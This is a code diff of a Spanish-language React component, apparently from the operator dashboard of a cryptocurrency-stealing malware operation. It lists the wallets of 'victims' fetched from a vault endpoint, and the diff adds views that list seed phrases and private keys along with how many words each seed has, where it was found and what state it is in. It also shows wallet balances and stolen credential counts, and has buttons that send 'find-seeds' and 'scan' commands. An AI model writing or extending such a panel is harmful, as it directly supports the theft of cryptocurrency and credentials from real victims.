@@ -1,9 +1,9 @@
 'use client';
-import { useState } from 'react';
-import { ChevronDown, ChevronRight, KeyRound, Search, Wallet } from 'lucide-react';
+import { useMemo, useState } from 'react';
+import { ChevronDown, ChevronRight, KeyRound, Search, Sprout, Wallet } from 'lucide-react';
 import { useApi } from '@/hooks/useApi';
 import type { VaultResponse } from '@/lib/types';
-import { ago, dateTime, mask } from '@/lib/format';
+import { ago, balanceNumber, balanceTone, dateTime, mask } from '@/lib/format';
 import { Badge } from '@/components/ui/badge';
 import { Button } from '@/components/ui/button';
 import { Empty, ErrorState, SkeletonRows } from '@/components/ui/table';
@@ -11,14 +11,62 @@ import { StateChip, VaultDrawer } from '@/components/vault-drawer';
 import { cn } from '@/lib/cn';
 
 const STATES = ['', 'decrypted', 'locked', 'found', 'no_vault', 'failed'] as const;
+type Mode = 'seed' | 'key' | 'wallet';
+
+type Leaf = {
+  key: string;
+  walletId: string;
+  secretId?: string;
+  kind: string;
+  preview: string;
+  words: number | null;
+  path: string;
+  source: string | null;
+  state: string;
+  targetId: string;
+  updatedAt: string;
+  seedFile: boolean;
+};
+
+const KIND_LABEL: Record<string, string> = { seed: 'semilla', private_key: 'clave privada', keystore: 'keystore', mnemonic: 'semilla' };
 
 export function VaultList({ victimId, onAction, disabled }: { victimId: string; onAction: (id: string) => void; disabled: boolean }) {
   const vault = useApi<VaultResponse>(`/victims/${victimId}/vault`, { pollMs: 10_000 });
   const [open, setOpen] = useState<string | null>(null);
   const [state, setState] = useState('');
+  const [mode, setMode] = useState<Mode>('seed');
   const [drawer, setDrawer] = useState<string | null>(null);
   const data = vault.data;
   const groups = (data?.groups ?? []).filter((group) => !state || group.wallets.some((wallet) => wallet.state === state));
+
+  const leaves = useMemo<Leaf[]>(() => {
+    const out: Leaf[] = [];
+    for (const group of groups) {
+      for (const wallet of group.wallets) {
+        if (state && wallet.state !== state) continue;
+        const secrets = wallet.secrets.filter((secret) => mode === 'seed' ? secret.kind === 'seed' : ['private_key', 'keystore'].includes(secret.kind));
+        if (mode === 'seed' && secrets.length === 0 && wallet.path && group.seedFile) {
+          out.push({
+            key: `${wallet.id}:file`, walletId: wallet.id, kind: 'seed_file', preview: 'fichero de semillas',
+            words: null, path: wallet.path, source: wallet.source ?? null, state: wallet.state,
+            targetId: group.targetId, updatedAt: wallet.lastSeenAt ?? '', seedFile: true
+          });
+          continue;
+        }
+        for (const secret of secrets) {
+          out.push({
+            key: `${wallet.id}:${secret.id}`, walletId: wallet.id, secretId: secret.id, kind: secret.kind,
+            preview: secret.preview, words: secret.words, path: wallet.path, source: wallet.source ?? null,
+            state: wallet.state, targetId: group.targetId, updatedAt: secret.updatedAt, seedFile: false
+          });
+        }
+      }
+    }
+    return out.sort((a, b) => b.updatedAt.localeCompare(a.updatedAt));
+  }, [groups, mode, state]);
+
+  const counters = data?.counters;
+  const wallets = (data?.groups ?? []).flatMap((group) => group.wallets);
 
   return (
     <div className="space-y-3">
@@ -28,7 +76,7 @@ export function VaultList({ victimId, onAction, disabled }: { victimId: string; 
         <div className="ml-auto flex flex-wrap gap-1">
           {STATES.map((value) => (
             <button key={value || 'all'} className="chip" data-active={state === value} onClick={() => setState(value)}>
-              {value || 'todo'} {value && data ? data.groups.reduce((sum, group) => sum + group.wallets.filter((wallet) => wallet.state === value).length, 0) : ''}
+              {value || 'todo'} {value && data ? wallets.filter((wallet) => wallet.state === value).length : ''}
             </button>
           ))}
         </div>
@@ -36,35 +84,79 @@ export function VaultList({ victimId, onAction, disabled }: { victimId: string; 
 
       {data ? (
         <div className="grid grid-cols-3 gap-2 sm:grid-cols-6">
-          {[
-            ['wallets', data.counters.wallets], ['targets', data.counters.targets], ['seeds', data.counters.seeds],
-            ['claves', data.counters.keys], ['contraseñas', data.counters.passwords], ['balance', data.counters.balances]
-          ].map(([label, value]) => (
-            <div key={label} className="rounded-lg border border-line bg-panel/40 px-2 py-1.5">
+          {([
+            ['wallets', counters?.wallets, () => setMode('wallet')],
+            ['targets', counters?.targets, () => setMode('wallet')],
+            ['semillas', counters?.seeds, () => setMode('seed')],
+            ['claves', counters?.keys, () => setMode('key')],
+            ['con saldo', counters?.balances, () => setMode('wallet')],
+            ['creds', counters?.credentials, () => setMode('wallet')]
+          ] as Array<[string, number | undefined, () => void]>).map(([label, value, pick]) => (
+            <button key={label} onClick={pick} className="rounded-lg border border-line bg-panel/40 px-2 py-1.5 text-left hover:bg-panel-2">
               <p className="text-2xs text-muted">{label}</p>
-              <p className="num text-lg text-ink">{value}</p>
-            </div>
+              <p className="num text-lg text-ink">{value ?? 0}</p>
+            </button>
           ))}
         </div>
       ) : null}
 
-      <p className="text-2xs text-muted">
-        Último escaneo: {data?.lastScan ? <span className="font-mono">{data.lastScan.name} · {data.lastScan.status} · {ago(data.lastScan.finishedAt ?? data.lastScan.createdAt)}</span> : '—'}
-        {data?.lastScan?.error ? <span className="ml-1 text-bad">{data.lastScan.error}</span> : null}
-      </p>
+      <div className="flex flex-wrap items-center gap-1 border-b border-line/60 pb-2">
+        {([['seed', 'Semillas'], ['key', 'Claves privadas'], ['wallet', 'Wallets']] as Array<[Mode, string]>).map(([id, label]) => (
+          <button key={id} className="chip" data-active={mode === id} onClick={() => setMode(id)}>{label}</button>
+        ))}
+        <span className="ml-auto text-2xs text-muted">
+          Último escaneo: {data?.lastScan ? <span className="font-mono">{data.lastScan.name} · {data.lastScan.status} · {ago(data.lastScan.finishedAt ?? data.lastScan.createdAt)}</span> : '—'}
+        </span>
+      </div>
+      {data?.lastScan?.error ? <p className="rounded border border-bad/30 bg-bad/10 p-2 text-2xs text-bad">{data.lastScan.error}</p> : null}
 
-      {vault.loading && !data ? <SkeletonRows rows={8} cols={4} /> : vault.error ? <ErrorState message={vault.error.message} retry={vault.refresh} /> : groups.length === 0 ? (
+      {vault.loading && !data ? <SkeletonRows rows={8} cols={4} /> : vault.error && !data ? <ErrorState message={vault.error.message} retry={vault.refresh} /> : (
+        <>
+          {vault.stale ? <p className="text-2xs text-warn">Datos sin refrescar: {vault.error?.message ?? 'sin conexión'}. Se reintenta solo.</p> : null}
+          {mode === 'wallet' ? walletGroups() : leafList()}
+        </>
+      )}
+      <VaultDrawer walletId={drawer} onClose={() => setDrawer(null)} />
+    </div>
+  );
+
+  function leafList() {
+    if (leaves.length === 0) {
+      return (
+        <Empty
+          title={mode === 'seed' ? 'Sin semillas ni ficheros de semillas' : 'Sin claves privadas'}
+          hint={mode === 'seed' ? 'Buscar seeds recorre ficheros y vaults conocidos; los hallazgos aparecen aquí con su ruta y origen.' : 'Las claves hex, WIF y keystores descifrados se listan aquí.'}
+          action={<Button size="sm" disabled={disabled} onClick={() => onAction(mode === 'seed' ? 'find-seeds' : 'scan')}>{mode === 'seed' ? 'Buscar seeds' : 'Escanear wallets'}</Button>}
+        />
+      );
+    }
+    return (
+      <ul className="divide-y divide-line/60 rounded-lg border border-line">
+        {leaves.map((leaf) => (
+          <li key={leaf.key} className="flex items-center gap-2 px-3 py-2">
+            <Badge tone={leaf.kind === 'seed' ? 'ok' : leaf.seedFile ? 'warn' : 'brand'}>{leaf.kind === 'seed' ? 'semilla' : KIND_LABEL[leaf.kind] ?? leaf.kind}</Badge>
+            {leaf.words ? <span className="text-2xs text-muted">{leaf.words} palabras</span> : null}
+            <span className="min-w-0 flex-1 truncate font-mono text-2xs text-ink" title={leaf.path}>{leaf.preview} <span className="text-muted/60">· {leaf.targetId}</span></span>
+            <StateChip state={leaf.state} />
+            <span className="hidden max-w-[28%] truncate font-mono text-2xs text-muted/70 sm:block" title={leaf.path}>{leaf.path}</span>
+            <span className="hidden text-2xs text-muted/60 lg:block">{dateTime(leaf.updatedAt)}</span>
+            <Button size="sm" variant="ghost" onClick={() => setDrawer(leaf.walletId)}>{leaf.kind === 'seed' ? 'ver semilla' : 'abrir'}</Button>
+          </li>
+        ))}
+      </ul>
+    );
+  }
+
+  function walletGroups() {
+    if (groups.length === 0) {
+      return (
         <Empty
           title={state ? 'Ninguna wallet en ese estado' : 'Sin wallets'}
           hint={state ? 'Cambia el filtro o lanza un escaneo nuevo.' : 'Pulsa Escanear wallets. Los resultados aparecen agrupados por target.'}
           action={!state ? <Button size="sm" disabled={disabled} onClick={() => onAction('scan')}>Escanear wallets</Button> : undefined}
         />
-      ) : group()}
-      <VaultDrawer walletId={drawer} onClose={() => setDrawer(null)} />
-    </div>
-  );
-
-  function group() {
+      );
+    }
     return (
       <div className="space-y-2">
         {groups.map((item) => {
@@ -83,7 +175,7 @@ export function VaultList({ victimId, onAction, disabled }: { victimId: string; 
                 <Badge>{item.kind}</Badge>
                 <StateChip state={item.state} />
                 {item.address ? <span className="font-mono text-2xs text-muted">{mask(item.address, 10)}</span> : <span className="text-2xs text-muted">address —</span>}
-                {item.balance && item.balance !== '0' ? <span className="num text-2xs text-warn">{item.balance}</span> : null}
+                {item.balance ? <span className={cn('num text-2xs', balanceTone(balanceNumber(item.balance)))}>{item.balance}</span> : null}
                 <span className="ml-auto text-2xs text-muted">{visible.length} perfiles · {ago(item.lastSeenAt)}</span>
               </button>
               {expanded ? (
@@ -94,8 +186,8 @@ export function VaultList({ victimId, onAction, disabled }: { victimId: string; 
                       <span className="max-w-[45%] truncate font-mono text-2xs text-muted" title={wallet.path}>{wallet.path}</span>
                       <StateChip state={wallet.state} />
                       <span className="ml-auto flex items-center gap-2 text-2xs text-muted">
-                        {wallet.secretCount ? <span className="text-ok"><KeyRound className="inline h-3 w-3" /> {wallet.secretCount}</span> : null}
-                        {wallet.secrets.some((secret) => secret.kind === 'seed') ? <Badge tone="ok">seed</Badge> : null}
+                        {wallet.secrets.some((secret) => secret.kind === 'seed') ? <Badge tone="ok">semilla</Badge> : null}
+                        {wallet.secretCount ? <span className="text-muted"><KeyRound className="inline h-3 w-3" /> {wallet.secretCount}</span> : null}
                         {dateTime(wallet.lastSeenAt)}
                       </span>
                     </button>
@@ -108,4 +200,8 @@ export function VaultList({ victimId, onAction, disabled }: { victimId: string; 
       </div>
     );
   }
+}
+
+export function SeedGlyph() {
+  return <Sprout className="h-3 w-3" />;
 }
